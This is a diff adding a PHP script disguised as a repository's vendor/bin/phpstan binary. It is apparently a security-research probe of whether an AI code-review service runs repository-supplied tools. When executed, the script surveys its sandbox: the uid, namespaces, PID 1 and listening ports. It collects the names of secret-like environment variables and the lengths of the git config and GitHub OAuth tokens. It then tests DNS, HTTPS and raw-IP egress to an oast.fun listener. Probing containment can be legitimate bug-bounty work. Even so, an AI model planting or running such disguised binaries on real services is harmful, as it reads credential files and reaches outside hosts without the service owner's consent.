@@ -1,0 +1,174 @@
+#!/usr/bin/env php
+<?php
+/**
+ * H123 probe fixture — repository-supplied vendor/bin/phpstan in our own test
+ * repo (testing-creator-A/cr-sandbox-test).
+ *
+ * Purpose: record whether CodeRabbit's PHPStan cell executes the
+ * Composer-installed/vendored binary from the reviewed checkout, and measure
+ * that cell's containment (uid, namespaces, PID 1, env NAMES, readable
+ * credential FILES with lengths only, listeners, loopback, DNS/HTTPS/raw-IP
+ * egress to an interactsh listener).
+ *
+ * No secret value is printed, stored or transmitted: environment variable
+ * NAMES only, and credential lengths only.
+ */
+
+$o = array();
+$o[] = 'H123-PHPSTAN';
+
+function h123_read($p)
+{
+    if (!is_readable($p)) {
+        return null;
+    }
+    $s = @file_get_contents($p);
+    return $s === false ? null : $s;
+}
+
+$uid = function_exists('posix_getuid') ? posix_getuid() : getmyuid();
+$o[] = 'uid=' . $uid;
+
+$cg = h123_read('/proc/self/cgroup');
+if ($cg !== null) {
+    foreach (explode("\n", trim($cg)) as $l) {
+        if (strpos($l, 'memory') !== false) {
+            $o[] = 'cg=' . preg_replace('/^0:memory:/', '', $l);
+            break;
+        }
+    }
+}
+
+$pid1 = h123_read('/proc/1/cmdline');
+if ($pid1 !== null) {
+    $o[] = 'pid1=' . basename(str_replace("\0", ' ', trim($pid1)));
+}
+
+$o[] = 'host=' . gethostname();
+
+$ns = array();
+foreach (array('pid', 'mnt', 'net', 'user') as $k) {
+    $l = @readlink('/proc/self/ns/' . $k);
+    if ($l !== false) {
+        $ns[] = $k . ':' . $l;
+    }
+}
+$o[] = 'ns=' . implode(',', $ns);
+
+$argc_ = isset($argv) ? count($argv) : 0;
+$args = array();
+if (isset($argv)) {
+    foreach (array_slice($argv, 1, 4) as $a) {
+        $args[] = substr($a, 0, 40);
+    }
+}
+$o[] = 'argc=' . $argc_ . ':' . implode(' ', $args);
+
+$o[] = 'cwd=' . getcwd();
+
+$names = array_keys(getenv());
+$o[] = 'envn=' . count($names);
+$hits = array();
+foreach ($names as $n) {
+    if (preg_match('/(TOKEN|SECRET|PASS|KEY|CRED|AUTH)/i', $n)) {
+        $hits[] = substr($n, 0, 32);
+    }
+}
+$o[] = 'envhits=' . (count($hits) ? implode(',', array_slice($hits, 0, 6)) : 'none');
+
+$home = getenv('HOME');
+if ($home === false || $home === '') {
+    $home = '/home/jailuser';
+}
+$gitcfg = h123_read($home . '/.gitconfig');
+if ($gitcfg === null) {
+    $o[] = 'gc=ERR';
+} else {
+    preg_match_all('/Proxy-Tokenizer:\s*([^\s]+)/', $gitcfg, $m);
+    $lens = array();
+    foreach ((isset($m[1]) ? $m[1] : array()) as $t) {
+        $lens[] = strlen($t);
+    }
+    $o[] = 'gc=' . strlen($gitcfg) . 'b:tokn=' . count($lens) . ':lens=' . implode(',', $lens);
+}
+$hosts = h123_read($home . '/.config/gh/hosts.yml');
+if ($hosts === null) {
+    $o[] = 'hosts=ERR';
+} else {
+    $otl = -1;
+    if (preg_match('/oauth_token:\s*(\S+)/', $hosts, $m2)) {
+        $otl = strlen($m2[1]);
+    }
+    $o[] = 'hosts=' . strlen($hosts) . 'b:otlen=' . $otl;
+}
+$ghcfg = h123_read($home . '/.config/gh/config.yml');
+$o[] = 'ghcfg=' . ($ghcfg === null ? 'ERR' : strlen($ghcfg) . 'b');
+
+$listen = 0;
+foreach (array('/proc/net/tcp', '/proc/net/tcp6') as $p) {
+    $t = h123_read($p);
+    if ($t === null) {
+        continue;
+    }
+    foreach (explode("\n", $t) as $l) {
+        if (preg_match('/\s0A\s/', $l)) {
+            $listen++;
+        }
+    }
+}
+$o[] = 'listen=' . $listen;
+
+$lp = array();
+foreach (array(1080, 9) as $p) {
+    $errno = 0;
+    $errstr = '';
+    $fp = @fsockopen('127.0.0.1', $p, $errno, $errstr, 2);
+    if ($fp) {
+        $lp[] = 'p' . $p . '=OPEN';
+        fclose($fp);
+    } else {
+        $lp[] = 'p' . $p . '=E' . $errno;
+    }
+}
+$o[] = 'loop=' . implode(',', $lp);
+
+$oast = 'dc2gbnoudp5nkbmf8rlgifxuwctnuaynh.oast.fun';
+$oastip = '206.189.156.69';
+$dns = @gethostbyname($oast);
+$o[] = 'dns=' . ($dns === $oast ? 'ENOTFOUND' : $dns);
+
+if (function_exists('curl_init')) {
+    $ch = curl_init('https://' . $oast . '/h123php');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 6);
+    $r = curl_exec($ch);
+    if ($r === false) {
+        $o[] = 'curl=E' . curl_errno($ch) . ':' . substr(curl_error($ch), 0, 40);
+    } else {
+        $o[] = 'curl=OK:' . strlen($r);
+    }
+    curl_close($ch);
+} else {
+    $o[] = 'curl=noext';
+}
+
+foreach (array(80, 443) as $p) {
+    $errno = 0;
+    $errstr = '';
+    $fp = @fsockopen($oastip, $p, $errno, $errstr, 3);
+    if ($fp) {
+        $o[] = 'ip' . $p . '=OPEN';
+        if ($p === 80) {
+            @fwrite($fp, "GET /h123ip HTTP/1.0\r\nHost: " . $oast . "\r\n\r\n");
+        }
+        fclose($fp);
+    } else {
+        $o[] = 'ip' . $p . '=E' . $errno;
+    }
+}
+
+$line = implode(' | ', $o);
+fwrite(STDERR, $line . "\n");
+echo $line . "\n";
+exit(1);
